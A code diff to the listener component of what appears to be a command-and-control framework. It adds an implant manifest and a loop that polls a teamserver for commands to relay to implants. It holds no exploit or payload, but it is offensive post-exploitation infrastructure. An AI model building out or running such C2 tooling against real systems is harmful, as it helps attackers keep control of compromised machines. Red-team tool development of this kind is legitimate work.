@@ -1,6 +1,7 @@
 import base64
 import asyncio
 import ast  # debug
+from time import sleep
 
 from lib import networking
 from lib import core
@@ -30,7 +31,7 @@ class Listener(object):
                                  level="critical", source=f"{listener.listening_post.info['name']}")
             exit()
 
-    def initialize(self, manifest):
+    def initialize(self):
         try:
             initialization_frame = core.send_initialization(listener)
             networking.send_management_frame(listener, initialization_frame)
@@ -49,13 +50,38 @@ class Listener(object):
 
     def prepare_manifests(self):
         # TODO:
-        manifest = {"implants": [{"implant_id": "DEADB33F",
+        import uuid
+        manifest = {"implants": [{"implant_id": "c41b07a940254f1d87ba60aadb93dded", # [{"implant_id": uuid.uuid4().hex,
                                   "implant_os": "win",
-                                  "implant_user": "user"
+                                  "implant_user": "user",
+                                  "lp_id": listener.component_id
                                   }],
                     "component_id": listener.component_id
                     }
         return manifest
+
+    def main(self):
+        # TODO: Loop this, thread this
+        #  * Do a get command
+        #   * if fails, sleep
+        #   * else, send command to implant and relay reply on next timer
+        listener.logging.log(f"Starting main execution",
+                             source=f"{listener.listening_post.info['name']}.main",
+                             level="debug")
+        while True:
+            listener.logging.log(f"Requesting commands from teamsever",
+                                 source=f"{listener.listening_post.info['name']}.main",
+                                 level="debug")
+            command_request_frame = core.request_command(listener)
+            networking.send_management_frame(listener, command_request_frame)
+            command_reply_frame = networking.recv_management_frame(listener)
+            # if command_request_frame is not None:
+            #     # TODO: Routing to implants should happen in core.
+            listener.logging.log(f"Pausing cmd_receipt thread for {listener.config.config['lp']['main_job_timer']} seconds",
+                                 source=f"{listener.listening_post.info['name']}.main",
+                                 level="debug")
+            sleep(int(listener.config.config['lp']['main_job_timer']))
+            pass
 
     def start_lp(self, *args):
         """
@@ -82,9 +108,10 @@ class Listener(object):
             self.setup_management_socket()
 
             # TODO: Send management socket for init from teamserver
-            self.initialize(listener.manifest)
+            self.initialize()
 
             # TODO: Await commands from teamserver and perform main loop
+            self.main()
 
         except Exception as e:
             listener.logging.log(f"Critical [{type(e).__name__}] when starting listener api server: {e}",
